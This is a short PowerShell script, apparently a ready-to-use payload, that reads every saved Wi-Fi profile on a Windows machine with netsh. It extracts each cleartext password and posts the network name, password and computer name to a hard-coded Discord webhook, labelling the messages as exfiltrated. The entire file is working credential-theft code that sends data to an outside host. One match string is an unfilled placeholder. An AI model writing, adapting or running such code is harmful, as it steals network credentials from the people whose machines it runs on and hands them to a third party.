#Insert your webhook here
$webhookUri = 'https://discord.com/api/webhooks/1254537070026686566/2ZjT5J2ZI7QmtXYjTZEKk8BAo9INn1fju_USCaYajnPHdUvEWi55WfWXawTDxoEtmYPZ'
#Get List of SSIDS
$SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
#A loop to get password for each SSID
$WifiInfo = foreach($SSID in $SSIDS) {
    $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String '{LANG VALUE}') -replace ".*:\s+"
    New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
#Creating the body of your message
    $Body = @{
   'username' = 'Agent'
   'content' = 'Wifi passwords exfiltrated from :  ' + '     ' +   $env:computername + ' Network :   ' + $SSID + '   ' + ' Password :   ' + $Password
   }
#Send your data using REST method
    Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
}  
